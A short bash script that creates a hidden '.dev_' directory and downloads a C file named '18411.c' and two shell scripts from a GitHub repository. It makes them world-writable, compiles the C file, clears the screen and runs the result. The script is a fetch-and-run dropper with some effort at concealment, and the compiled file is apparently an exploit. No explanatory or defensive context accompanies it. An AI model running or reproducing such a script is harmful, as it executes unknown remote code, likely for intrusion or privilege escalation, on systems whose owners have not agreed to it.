#!/bin/bash
mkdir .dev_
cd .dev_
wget https://raw.githubusercontent.com/Ren0X1/linuxtest/main/18411.c
wget https://raw.githubusercontent.com/Ren0X1/linuxtest/main/mandanga.sh
wget https://raw.githubusercontent.com/Ren0X1/linuxtest/main/remove.sh
chmod 777 *
gcc -o build 18411.c
chmod 777 *
clear
./build